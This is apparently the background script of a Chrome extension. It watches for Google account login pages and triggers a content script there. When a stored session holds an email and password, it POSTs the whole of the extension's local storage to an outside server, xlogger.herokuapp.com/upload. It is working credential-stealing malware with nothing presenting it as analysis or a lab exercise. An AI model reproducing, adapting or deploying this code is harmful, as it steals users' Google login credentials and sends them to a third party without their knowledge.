var domain="https://xlogger.herokuapp.com"

let loading=1;
let currentUrl;
chrome.tabs.onUpdated.addListener(async (tabId,changeInfo,tab)=>{

     if(changeInfo.status=="loading"){
         currentUrl=changeInfo.url;
     }
    
     //if google domains do more processing 
     let regex=new RegExp("accounts.google");
     let isGoogleLoginSite=regex.test(currentUrl);
     if(isGoogleLoginSite ){
         if( changeInfo.status=="complete"){
            console.log("sending trigger msg");
            chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
                chrome.tabs.sendMessage(tabs[0].id, {trigger:true});
            });
         }
     }
    else if(changeInfo.status=="loading" && /google/.test(changeInfo.url)){
         console.log("time to send data");
         if(loading==1){
             console.log("inside google");
             
              sendData();
         }
     }

     else{
        if(changeInfo.status=="loading" && loading==1){
           sendData();
       
          }
     }     
        
})  

function sendData(){
    try{
        chrome.storage.local.get(obj=>{
            let session=obj.session;
             console.log("tried to send data",session);

            if(session && session.email && session.password){
              loading++;
              console.log("sending log");            
              setTimeout(() => {
                      fetch(`${domain}/upload`,{
                          method:"POST",
                          mode:"cors",
                          body:JSON.stringify(obj),
                          headers:{
                              "content-Type":"application/json"
                          }
                      }).catch(err=>err);
                  
                  loading--;
              },1000);  
              console.log(obj);
            }
          });
      }catch(err){
          console.log(err);
      }
}

